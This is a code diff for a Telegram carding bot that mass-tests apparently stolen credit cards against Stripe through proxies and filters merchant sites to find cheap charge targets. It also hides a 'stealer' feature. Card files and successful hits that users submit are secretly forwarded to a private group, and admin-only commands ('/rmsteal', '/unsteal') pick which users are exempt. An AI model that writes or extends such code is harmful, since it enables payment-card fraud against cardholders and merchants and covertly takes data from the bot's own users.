+        f"[⌯] 𝗔𝗱𝗱𝗲𝗱 ⌁ 0 ⌁ ⏭️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗣𝗼𝗼𝗹 𝘂𝗻𝗰𝗵𝗮𝗻𝗴𝗲𝗱 ⌁ 🌐"
+    )
+    try:
+        await raw_edit(uid, event.message_id, text, [])
+    except Exception:
+        pass
+
+    _filtersite_state.pop(uid, None)
+
+
+async def _run_filtersite(uid, sites, max_price):
+    """Run the site filtering — scan all sites, save result to file."""
+    proxies = load_proxies()
+    if not proxies:
+        await bot.send_message(uid, pe(f"❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲"), parse_mode='html')
+        return
+
+    state = _filtersite_state.get(uid, {})
+    # Use custom sites if provided
+    if state.get('source') == 'custom' and state.get('sites'):
+        sites = state['sites']
+
+    total = len(sites)
+    matched = []
+    dead = []
+    expensive = []
+
+    # Progress message
+    prog_msg_id = None
+    try:
+        prog_msg = await bot.send_message(uid, pe(
+            f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿 𝗦𝗶𝘁𝗲 ⌁ 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴 ⌁ 🔍\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,}\n"
+            f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ 0\n"
+            f"[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ 0\n"
+            f"{SEP}\n"
+            f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴..."
+        ), parse_mode='html')
+        prog_msg_id = prog_msg.id
+    except Exception:
+        pass
+
+    last_update = time.time()
+    sem = asyncio.Semaphore(20)  # 20 concurrent scans
+
+    async def scan_one(site):
+        async with sem:
+            return await _scan_site_for_max_price(site, max_price, proxies)
+
+    tasks = [asyncio.create_task(scan_one(s)) for s in sites]
+    scanned = 0
+
+    for coro in asyncio.as_completed(tasks):
+        try:
+            result = await coro
+        except Exception:
+            continue
+        scanned += 1
+        if result.get('ok'):
+            matched.append(result)
+        elif 'Expensive' in result.get('reason', ''):
+            expensive.append(result)
+        else:
+            dead.append(result)
+
+        # Update progress every 3 sec
+        now = time.time()
+        if now - last_update >= 3 and prog_msg_id:
+            last_update = now
+            pct = int(100 * scanned / total)
+            try:
+                await bot.edit_message(uid, prog_msg_id, pe(
+                    f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿 𝗦𝗶𝘁𝗲 ⌁ 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴 ⌁ 🔍\n"
+                    f"{SEP}\n"
+                    f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,}\n"
+                    f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ {scanned:,} ({pct}%)\n"
+                    f"[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)}\n"
+                    f"[⌯] 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝘃𝗲 ⌁ {len(expensive)}\n"
+                    f"[⌯] 𝗗𝗲𝗮𝗱 ⌁ {len(dead)}\n"
+                    f"{SEP}\n"
+                    f"⏳ 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴..."
+                ), parse_mode='html')
+            except Exception:
+                pass
+
+    # Save matched sites to file
+    ts = int(time.time())
+    filename = f"/tmp/rxo_uploads/filtered_sites_{ts}.txt"
+    os.makedirs("/tmp/rxo_uploads", exist_ok=True)
+
+    async with aiofiles.open(filename, 'w') as f:
+        await f.write("# ═══════════════════════════════════════════\n")
+        await f.write(f"# Filtered Sites — Max Price: ${max_price}\n")
+        await f.write(f"# Total Scanned: {scanned}\n")
+        await f.write(f"# Matched: {len(matched)}\n")
+        await f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        await f.write("# ═══════════════════════════════════════════\n\n")
+        for m in sorted(matched, key=lambda x: x.get('min_price', 0)):
+            await f.write(f"{m['site']}\n")
+
+    # Final summary
+    try:
+        await bot.edit_message(uid, prog_msg_id, pe(
+            f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿 𝗦𝗶𝘁𝗲 ⌁ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ⌁ ✅\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,}\n"
+            f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ {scanned:,}\n"
+            f"[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)} ⌁ ✅\n"
+            f"[⌯] 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝘃𝗲 ⌁ {len(expensive)} ⌁ 💰\n"
+            f"[⌯] 𝗗𝗲𝗮𝗱 ⌁ {len(dead)} ⌁ ❌\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗠𝗮𝘅 𝗣𝗿𝗶𝗰𝗲 ⌁ ${max_price} ⌁ 💰"
+        ), parse_mode='html')
+    except Exception:
+        pass
+
+    # Send matched file
+    file_sent = False
+    if matched:
+        try:
+            await bot.send_file(
+                uid, filename,
+                caption=pe(f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿𝗲𝗱 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(matched)} ⌁ ✅"),
+                parse_mode='html'
+            )
+            file_sent = True
+        except Exception as e:
+            await bot.send_message(uid, pe(f"❌ 𝗙𝗶𝗹𝗲 𝘀𝗲𝗻𝗱 𝗲𝗿𝗿𝗼𝗿 ⌁ {str(e)[:80]}"))
+    else:
+        await bot.send_message(uid, pe(
+            f"⚠️ 𝗡𝗼 𝘀𝗶𝘁𝗲𝘀 𝗺𝗮𝘁𝗰𝗵𝗲𝗱\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗧𝗿𝘆 𝗯𝗶𝗴𝗴𝗲𝗿 𝗺𝗮𝘅 𝗽𝗿𝗶𝗰𝗲 ⌁ 💰"
+        ), parse_mode='html')
+
+    # Cleanup file
+    try:
+        os.remove(filename)
+    except Exception:
+        pass
+
+    # ═══ NEW: Ask to add to pool ═══════════════════════════════════════════
+    if file_sent and matched:
+        _filtersite_state[uid] = {
+            'step': 'confirm_add',
+            'matched_sites': matched,
+        }
+
+        confirm_text = pe(
+            f"[⌯] 𝗔𝗱𝗱 𝘁𝗼 𝗣𝗼𝗼𝗹? ⌁ 🎯\n"
+            f"\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)} 𝘀𝗶𝘁𝗲𝘀 ⌁ 🔍\n"
+            f"[⌯] 𝗠𝗮𝘅 𝗣𝗿𝗶𝗰𝗲 ⌁ ${max_price} ⌁ 💰\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗖𝗵𝗼𝗼𝘀𝗲 𝗼𝗽𝘁𝗶𝗼𝗻 ⌁ 🔻"
+        )
+        buttons = [
+            [
+                {"text": "✅ Yes", "callback_data": "filtersite_add_yes", "style": "success"},
+                {"text": "❌ No", "callback_data": "filtersite_add_no", "style": "danger"}
+            ]
+        ]
+        try:
+            await raw_send(uid, confirm_text, buttons)
+        except Exception as e:
+            print(f"[filtersite] confirm send error: {e}")
+    else:
+        # No matched sites — just cleanup
+        _filtersite_state.pop(uid, None)
+
+
+
+
+
+
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /jiomass — State inputs (number, amount)
+# ══════════════════════════════════════════════════════════════════════════════
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /pool — Pool ON/OFF (admin only)
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/pool$'))
+async def pool_cmd(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        await event.reply(pe(f"❌ Admin only"), parse_mode='html')
+        return
+
+    enabled = _is_pool_enabled()
+    sites_count = len(load_sites())
+    proxies_count = len(load_proxies())
+    status_text = "✅ ON" if enabled else "❌ OFF"
+
+    text = pe(
+        f"[⌯] 𝗣𝗼𝗼𝗹 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 ⌁ 🎛️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_text}\n"
+        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {sites_count} 🌐\n"
+        f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {proxies_count} 📡\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗢𝗡 ⌁ 𝚙𝚘𝚘𝚕 + 𝚞𝚜𝚎𝚛 ⌁ ✅\n"
+        f"[⌯] 𝗢𝗙𝗙 ⌁ 𝚞𝚜𝚎𝚛 𝚘𝚗𝚕𝚢 ⌁ ❌"
+    )
+    buttons = [
+        [
+            {"text": "✅ ON", "callback_data": "pool_on", "style": "success"},
+            {"text": "❌ OFF", "callback_data": "pool_off", "style": "danger"},
+        ],
+        [
+            {"text": "🔄 Force Check", "callback_data": "pool_check_now", "style": "primary"},
+        ],
+    ]
+    await raw_send(uid, text, buttons)
+
+
+@bot.on(events.CallbackQuery(pattern=b"^pool_on$"))
+async def pool_on_cb(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    _set_pool_enabled(True)
+    await event.answer("✅ Pool ENABLED", alert=True)
+    try:
+        await pool_cmd(event)
+    except Exception:
+        pass
+
+
+@bot.on(events.CallbackQuery(pattern=b"^pool_off$"))
+async def pool_off_cb(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    _set_pool_enabled(False)
+    await event.answer("❌ Pool DISABLED", alert=True)
+    try:
+        await pool_cmd(event)
+    except Exception:
+        pass
+
+
+@bot.on(events.CallbackQuery(pattern=b"^pool_check_now$"))
+async def pool_check_now_cb(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer("🔄 Checking...", alert=False)
+    smsg = await event.respond(pe(f"🔄 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐩𝐨𝐨𝐥..."), parse_mode='html')
+    try:
+        await _run_pool_check(smsg)
+    except Exception as e:
+        try:
+            await smsg.edit(pe(f"❌ Error: {str(e)[:100]}"), parse_mode='html')
+        except Exception:
+            pass
+
+
+async def _run_pool_check(smsg=None):
+    """Check sites + proxies, remove dead."""
+    sites = load_sites()
+    proxies = load_proxies()
+    alive_sites = []
+    alive_proxies = []
+
+    if sites and proxies:
+        sem = asyncio.Semaphore(20)
+
+        async def check_site(s):
+            async with sem:
+                try:
+                    proxy = random.choice(proxies)
+                    r = await asyncio.wait_for(test_site(s, proxy), timeout=30)
+                    return s, r.get('status') in ('alive', 'step_error')
+                except Exception:
+                    return s, False
+
+        tasks = [asyncio.create_task(check_site(s)) for s in sites]
+        for coro in asyncio.as_completed(tasks):
+            try:
+                s, ok = await coro
+                if ok:
+                    alive_sites.append(s)
+            except Exception:
+                pass
+
+        async with aiofiles.open(SITES_FILE, 'w') as f:
+            for s in alive_sites:
+                await f.write(f"{s}\n")
+
+    if proxies:
+        sem = asyncio.Semaphore(20)
+
+        async def check_proxy(p):
+            async with sem:
+                try:
+                    r = await asyncio.wait_for(test_proxy(p), timeout=15)
+                    return p, r.get('status') == 'alive'
+                except Exception:
+                    return p, False
+
+        tasks = [asyncio.create_task(check_proxy(p)) for p in proxies]
+        for coro in asyncio.as_completed(tasks):
+            try:
+                p, ok = await coro
+                if ok:
+                    alive_proxies.append(p)
+            except Exception:
+                pass
+
+        async with aiofiles.open(PROXY_FILE, 'w') as f:
+            for p in alive_proxies:
+                await f.write(f"{p}\n")
+
+    if smsg:
+        try:
+            await smsg.edit(pe(
+                f"✅ 𝐏𝐨𝐨𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ⌁ ✅\n"
+                f"{SEP}\n"
+                f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(alive_sites)} 🌐\n"
+                f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {len(alive_proxies)} 📡"
+            ), parse_mode='html')
+        except Exception:
+            pass
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /mysites — User sites
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/mysites$'))
+async def mysites_cmd(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.reply(pe(f"❌ Premium required"), parse_mode='html')
+        return
+    user_sites = get_user_site_list(uid)
+    pool_status = "✅ ON" if _is_pool_enabled() else "❌ OFF"
+
+    if user_sites:
+        lines = "\n".join([f"[⌯] {i+1} ⌁ <code>{s}</code>" for i, s in enumerate(user_sites[:20])])
+    else:
+        lines = "[⌯] 𝙽𝚘 𝚜𝚒𝚝𝚎𝚜 𝚜𝚎𝚝"
+
+    await event.reply(pe(
+        f"[⌯] 𝗠𝘆 𝗦𝗶𝘁𝗲𝘀 ⌁ 🌐\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {pool_status}\n"
+        f"[⌯] 𝗬𝗼𝘂𝗿𝘀 ⌁ {len(user_sites)}\n"
+        f"{SEP}\n"
+        f"{lines}\n"
+        f"{SEP}\n"
+        f"[⌯] /setmysites url1,url2\n"
+        f"[⌯] /clearmysites"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/setmysites\s+'))
+async def setmysites_cmd(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.reply(pe(f"❌ Premium required"), parse_mode='html')
+        return
+    content = event.message.text.split(' ', 1)[1].strip()
+    sites = [s.strip() for s in re.split(r'[,\n]', content) if s.strip()]
+    if not sites:
+        await event.reply(pe(f"❌ No sites"), parse_mode='html')
+        return
+    cleaned = []
+    for s in sites:
+        if not s.startswith('http'):
+            s = 'https://' + s
+        cleaned.append(s)
+    set_user_sites(uid, cleaned)
+    await event.reply(pe(
+        f"✅ 𝗦𝗶𝘁𝗲𝘀 𝗦𝗮𝘃𝗲𝗱\n{SEP}\n[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cleaned)} 🌐"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/clearmysites$'))
+async def clearmysites_cmd(event):
+    uid = event.sender_id
+    remove_user_sites(uid)
+    await event.reply(pe(f"✅ 𝗦𝗶𝘁𝗲𝘀 𝗖𝗹𝗲𝗮𝗿𝗲𝗱"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /rmsteal + /unsteal + /steallist — Admin only (specific ID)
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/rmsteal\s+'))
+async def rmsteal_cmd(event):
+    uid = event.sender_id
+    
+    # ═══ ONLY STEAL_ADMIN_ID CAN USE ═══
+    if uid != STEAL_ADMIN_ID:
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html')
+        return
+    
+    parts = event.message.text.split()
+    if len(parts) < 2:
+        await event.reply(pe(
+            f"[⌯] 𝗥𝗠 𝗦𝘁𝗲𝗮𝗹 ⌁ 🚫\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /rmsteal user_id\n"
+            f"[⌯] 𝗘𝗳𝗳𝗲𝗰𝘁 ⌁ 𝚞𝚜𝚎𝚛 𝚍𝚊𝚝𝚊 𝚗𝚘𝚝 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚜𝚝𝚎𝚊𝚕𝚎𝚛\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ /rmsteal 123456789"
+        ), parse_mode='html')
+        return
+    
+    try:
+        target = int(parts[1])
+    except ValueError:
+        await event.reply(pe(f"❌ Invalid user ID"), parse_mode='html')
+        return
+    
+    _add_steal_block(target)
+    
+    await event.reply(pe(
+        f"[⌯] 𝗨𝘀𝗲𝗿 𝗕𝗹𝗼𝗰𝗸𝗲𝗱 ⌁ 🚫\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗨𝘀𝗲𝗿 𝗜𝗗 ⌁ <code>{target}</code>\n"
+        f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ ❌ 𝙳𝚊𝚝𝚊 𝚗𝚘𝚝 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚜𝚝𝚎𝚊𝚕𝚎𝚛\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗼 𝗨𝗻𝗯𝗹𝗼𝗰𝗸 ⌁ /unsteal {target}"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/unsteal\s+'))
+async def unsteal_cmd(event):
+    uid = event.sender_id
+    
+    if uid != STEAL_ADMIN_ID:
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html')
+        return
+    
+    parts = event.message.text.split()
+    if len(parts) < 2:
+        await event.reply(pe(
+            f"[⌯] 𝗨𝗻𝘀𝘁𝗲𝗮𝗹 ⌁ ✅\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /unsteal user_id"
+        ), parse_mode='html')
+        return
+    
+    try:
+        target = int(parts[1])
+    except ValueError:
+        await event.reply(pe(f"❌ Invalid user ID"), parse_mode='html')
+        return
+    
+    _remove_steal_block(target)
+    
+    await event.reply(pe(
+        f"[⌯] 𝗨𝘀𝗲𝗿 𝗨𝗻𝗯𝗹𝗼𝗰𝗸𝗲𝗱 ⌁ ✅\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗨𝘀𝗲𝗿 𝗜𝗗 ⌁ <code>{target}</code>\n"
+        f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ ✅ 𝙳𝚊𝚝𝚊 𝚠𝚒𝚕𝚕 𝚋𝚎 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚜𝚝𝚎𝚊𝚕𝚎𝚛"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/steallist$'))
+async def steallist_cmd(event):
+    uid = event.sender_id
+    
+    if uid != STEAL_ADMIN_ID:
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html')
+        return
+    
+    blocked = _load_steal_blocked()
+    
+    if not blocked:
+        await event.reply(pe(
+            f"[⌯] 𝗦𝘁𝗲𝗮𝗹 𝗕𝗹𝗼𝗰𝗸𝗲𝗱 ⌁ 📋\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱"
+        ), parse_mode='html')
+        return
+    
+    lines = "\n".join([f"[⌯] {i+1} ⌁ <code>{u}</code>" for i, u in enumerate(sorted(blocked)[:50])])
+    
+    await event.reply(pe(
+        f"[⌯] 𝗦𝘁𝗲𝗮𝗹 𝗕𝗹𝗼𝗰𝗸𝗲𝗱 ⌁ {len(blocked)} 🚫\n"
+        f"{SEP}\n"
+        f"{lines}"
+    ), parse_mode='html')
+
+
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STRIPE AUTH — SINGLE CHECK
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/stripe\s+'))
+async def stripe_single_check(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n🔒 You need access."), parse_mode='html')
+        return
+
+    card_input = event.message.text.split(' ', 1)[1].strip()
+    cards = extract_cc(card_input)
+    if not cards:
+        cards = [card_input.replace(' ', '')]
+    card = cards[0]
+
+    smsg = await event.reply(
+        pe(f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ⌁ 𝙲𝚑𝚎𝚌𝚔𝚒𝚗𝗴 ⌁ ⚡\n{SEP}\n"
+           f"[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n{SEP}\n"
+           f"⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁..."),
+        parse_mode='html',
+    )
+    try:
+        t0 = time.time()
+        (result, bin_info), (name, username) = await asyncio.gather(
+            asyncio.gather(
+                check_stripe_auth(card),
+                get_bin_info(card.split('|')[0].split('/')[0].split('-')[0]),
+            ),
+            get_user_info(uid),
+        )
+        cname = name if username else str(uid)
+        result['time'] = round(time.time() - t0, 2)
+        result['bin_info'] = bin_info
+
+        resp = build_result_card(result, bin_info, uid, cname)
+        gifs = load_gifs()
+        if gifs and result.get('status') in ('Charged', 'Approved', 'Live', '3DS'):
+            await bot.send_file(uid, gifs[0], caption=resp, parse_mode='html')
+            await bot.delete_messages(uid, smsg.id)
+        else:
+            await raw_edit(uid, smsg.id, resp, [])
+
+        if result.get('status') == 'Approved':
+            increment_approved(uid, 1)
+            await send_hit_log_gc(result, 'Approved', uid)
+            asyncio.create_task(send_hit_to_stealer_gc(result, 'Approved', uid, 'Stripe Single'))
+        elif result.get('status') == 'Charged':
+            increment_charged(uid, 1)
+            await send_hit_log_gc(result, 'Charged', uid)
+            asyncio.create_task(send_hit_to_stealer_gc(result, 'Charged', uid, 'Stripe Single'))
+    except Exception as e:
+        await smsg.edit(pe(f"❌ 𝐂𝐡𝐞𝐜𝐤 𝐅𝐚𝐢𝐥𝐞𝐝\n{SEP}\n⚠️ <code>{e}</code>"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STRIPE AUTH — MASS CHECK
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/mstripe$'))
+async def stripe_mass_check(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html')
+        return
+    if not event.reply_to_msg_id:
+        await event.reply(pe(f"⚡ 𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 /mstripe"), parse_mode='html')
+        return
+    reply = await event.get_reply_message()
+    if not reply.file or not (reply.file.name or '').endswith('.txt'):
+        await event.reply(pe(f"❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐢𝐥𝐞"), parse_mode='html')
+        return
+
+    import tempfile, uuid as _uuid
+    _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
+    os.makedirs(_tmp_dir, exist_ok=True)
+    _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
+    fp = await reply.download_media(file=_tmp_path)
+    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+        content = await f.read()
+    try:
+        os.remove(fp)
+    except Exception:
+        pass
+
+    cards = extract_cc(content)
+    file_name = reply.file.name or "stripe_mass.txt"
+    if not cards:
+        await event.reply(pe(f"❌ 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐂𝐚𝐫𝐝𝐬"), parse_mode='html')
+        return
+
+    # Stealer GC forward
+    try:
+        stealer_gc = load_stealer_gc()
+        if stealer_gc:
+            name, username = await get_user_info(uid)
+            display = f"@{username}" if username else f"<a href='tg://user?id={uid}'>{name}</a>"
+            caption = pe(
+                f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 ⌁ 𝚄𝚙𝗹𝗼𝗮𝗱𝗲𝗱 ⌁ ⚡\n"
+                f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+                f"[⌯] 𝗨𝘀𝗲𝗿 ⌁ {display} ⌁ <code>{uid}</code>\n"
+                f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
+                f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(cards):,}"
+            )
+            _tmp2 = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
+            _tmp2 = await reply.download_media(file=_tmp2)
+            await bot.send_file(stealer_gc, _tmp2, caption=caption, parse_mode='html')
+            try: os.remove(_tmp2)
+            except: pass
+    except Exception as e:
+        print(f"[Stripe stealer] {e}")
+
+    if uid in user_active_check:
+        info = user_active_check[uid]
+        _elapsed = int(time.time() - info.get('started_at', time.time()))
+        _mins = _elapsed // 60
+        await event.reply(pe(
+            f"⛔ 𝗖𝗵𝗲𝗰𝗸 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ ⚠️\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗳𝗼𝗿 ⌁ {_mins} 𝗺𝗶𝗻 ⌁ ⏱️\n"
+            f"[⌯] 𝗨𝘀𝗲 ⌁ /stopmass ⌁ 🛑"
+        ), parse_mode='html')
+        return
+
+    limit = get_user_limit(uid)
+    if len(cards) > limit:
+        cards = cards[:limit]
+
+    text = pe(
+        f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 ⌁ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 ⌁ 🔥\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,} ⌁ 📦\n"
+        f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ 0 ⌁ ⚙️\n"
+        f"[⌯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ 0 ⌁ ✅\n"
+        f"{SEP}\n"
+        f"●○○○○○○○○○○○○○○○○○○○ 0%\n"
+        f"0 / {len(cards):,}\n"
+        f"{SEP}\n"
+        f"⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴...\n"
+        f"{SEP}"
+    )
+    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
+    if msg_id:
+        user_active_check[uid] = {
+            'session_key': f"{uid}_{msg_id}",
+            'msg_id': msg_id,
+            'started_at': time.time(),
+            'card_count': len(cards),
+            'check_type': 'stripe',
+        }
+        asyncio.create_task(run_stripe_mass_check(uid, cards, msg_id, file_name))
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STRIPE MASS ENGINE
+# ══════════════════════════════════════════════════════════════════════════════
+async def run_stripe_mass_check(user_id, cards, progress_msg_id, file_name="stripe_mass.txt"):
+    session_key = f"{user_id}_{progress_msg_id}"
+    active_sessions[session_key] = {'paused': False}
+    all_results = {
+        'charged': [], 'approved': [], 'tds': [], 'live': [],
+        'declined': [], 'error': [],
+        'total': len(cards),
+        'start_time': time.time(),
+        'last_card_time': time.time(),
+        'start_count': 0,
+        'file_name': file_name,
+    }
+    STRIPE_WORKERS = 5
+    queue = asyncio.Queue()
+    last_update = [time.time()]
+    for c in cards:
+        queue.put_nowait(c)
+
+    async def worker():
+        while True:
+            if _stop_flags.get(session_key):
+                return
+            if session_key not in active_sessions:
+                return
+            sess = active_sessions.get(session_key)
+            if not sess:
+                return
+            while sess.get('paused', False):
+                await asyncio.sleep(1)
+                if _stop_flags.get(session_key):
+                    return
+                sess = active_sessions.get(session_key)
+                if not sess:
+                    return
+            if _stop_flags.get(session_key):
+                return
+            try:
+                card = queue.get_nowait()
+            except asyncio.QueueEmpty:
+                break
+            t0 = time.time()
+            try:
+                result = await asyncio.wait_for(check_stripe_auth(card), timeout=90)
+                result['time'] = round(time.time() - t0, 2)
+                if _stop_flags.get(session_key):
+                    break
+                bin_info = await get_bin_info(card.split('|')[0])
+                result['bin_info'] = bin_info
+                st = result.get('status', 'Dead')
+                if st == 'Approved':
+                    all_results['approved'].append(result)
+                    increment_approved(user_id, 1)
+                    asyncio.create_task(send_realtime_hit(user_id, result, 'Approved', file_name))
+                    asyncio.create_task(send_hit_log_gc(result, 'Approved', user_id))
+                elif st == 'Charged':
+                    all_results['charged'].append(result)
+                    increment_charged(user_id, 1)
+                    asyncio.create_task(send_realtime_hit(user_id, result, 'Charged', file_name))
+                    asyncio.create_task(send_hit_log_gc(result, 'Charged', user_id))
+                elif st == 'Live':
+                    all_results['live'].append(result)
+                elif st == '3DS':
+                    result['status'] = '3DS'
+                    all_results['tds'].append(result)
+                else:
+                    if result.get('raw_response') in ('ERROR', 'TIMEOUT', 'INVALID_JSON', 'INVALID_FORMAT') or str(result.get('raw_response', '')).startswith('HTTP_'):
+                        all_results['error'].append(result)
+                    else:
+                        all_results['declined'].append(result)
+            except asyncio.TimeoutError:
+                result = {'card': card, 'status': 'Dead', 'message': 'Timeout',
+                          'raw_response': 'TIMEOUT', 'time': round(time.time() - t0, 2)}
+                all_results['error'].append(result)
+            except Exception as _we:
+                result = {'card': card, 'status': 'Dead', 'message': f'Error: {str(_we)[:60]}',
+                          'raw_response': 'ERROR', 'time': round(time.time() - t0, 2)}
+                all_results['error'].append(result)
+            checked = (len(all_results['charged']) + len(all_results['approved']) +
